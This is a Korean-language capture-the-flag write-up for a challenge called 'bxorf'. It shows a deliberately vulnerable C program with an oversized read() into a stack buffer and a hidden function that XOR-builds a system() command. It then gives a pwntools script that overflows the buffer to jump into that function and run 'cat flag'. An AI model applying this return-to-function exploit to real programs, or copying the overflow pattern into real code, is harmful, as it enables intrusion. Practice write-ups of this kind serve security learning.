# bxorf

# Usage


# Concept
- bof
- xor

# Writeup

#### bxorf.c
```C
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

__attribute__((visibility("hidden"))) void cat() {
    uint64_t a = 0x63617420;
    char input[11]; //3735928559
    uint64_t b = 0xb8c1df88; //0x7c465b2d
    uint64_t c = 0; 
    write(1,"Meow Meow: ",11);
    read(0,input, 10);
    c = atoi(input);
    uint64_t result = c^b;

    char asciiStr1[5];
    asciiStr1[0] = (a >> 24) & 0xFF; // 가장 상위 바이트
    asciiStr1[1] = (a >> 16) & 0xFF; // 두 번째 바이트
    asciiStr1[2] = (a >> 8) & 0xFF;  // 세 번째 바이트
    asciiStr1[3] = a & 0xFF;         // 가장 하위 바이트
    asciiStr1[4] = '\0';                  // 문자열의 끝을 나타내는 null 문자
    char asciiStr2[5];  // 네 문자와 null 종단을 위한 공간
    asciiStr2[0] = (result >> 24) & 0xFF; // 가장 상위 바이트
    asciiStr2[1] = (result >> 16) & 0xFF; // 두 번째 바이트
    asciiStr2[2] = (result >> 8) & 0xFF;  // 세 번째 바이트
    asciiStr2[3] = result & 0xFF;         // 가장 하위 바이트
    asciiStr2[4] = '\0';                  // 문자열의 끝을 나타내는 null 문자

    char command[10];
    sprintf(command, "%s%s", asciiStr1, asciiStr2);
    system(command);

}

void ls(){
    int a = 0xabcde575;  // 첫 번째 16진수 정수
    int b = 0xc7bec55b;  // 두 번째 16진수 정수

    // XOR 연산을 수행합니다.
    int result = a ^ b;

    // 결과를 바이트 단위로 분리하여 ASCII 코드로 변환합니다.
    char asciiStr[5];  // 네 문자와 null 종단을 위한 공간
    asciiStr[0] = (result >> 24) & 0xFF; // 가장 상위 바이트
    asciiStr[1] = (result >> 16) & 0xFF; // 두 번째 바이트
    asciiStr[2] = (result >> 8) & 0xFF;  // 세 번째 바이트
    asciiStr[3] = result & 0xFF;         // 가장 하위 바이트
    asciiStr[4] = '\0';                  // 문자열의 끝을 나타내는 null 문자

    // 결과 문자열을 출력합니다.
    system(asciiStr);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

int main() {
    
    init();

    char buf[0x20] = {};
    printf("<File List>\n");
    ls();


    printf("Can You \"CAT\"ch the flag?: ");
    read(0, buf, 0x40);
    printf("(^ ・x ・^): %s\n",buf);

    return 0;
}

```

xor 에는 특이한 성질이 존재합니다. a^b=c 라면 a^c=b 라는 것입니다.
이는 xor에 가장 중요한 특징이라고 생각합니다.

ls() 함수에서는 이를 이용하여 ls를 구현하고 일부러 strip을 진행하지 않아 코드 해석을 통해 "ls ." 이라는 문자열이 system 함수로 인해 실행된다는 것을 볼 수 있습니다.

이를 기억하고 main() 함수에서 bof를 통해 strip이 진행 된 cat() 함수로 실행함수를 옮기고 앞 4개의 문자열이 "cat " 이라는 것을 확인하여 뒤 4자리 문자열은 flag가 되도록 xor 될 입력값을 찾으면 됩니다.

int로 입력을 받으므로 "3735928559" 입력해주면 됩니다.
그러면 "cat flag"가 완성되고 system으로 인해 실행되어 flag가 출력됩니다.

#### ex.py
```python
from pwn import *

p = process('./bxorf')

ret = 0x40101a
cat = 0x401216
payload = b'a'*0x28 + p64(ret) +p64(cat)

p.send(payload)
p.recvuntil("Meow Meow: ")
p.send(str(3735928559))

p.interactive()

```

printf 정렬을 위해 ret을 추가하여 stack을 정렬해주었습니다.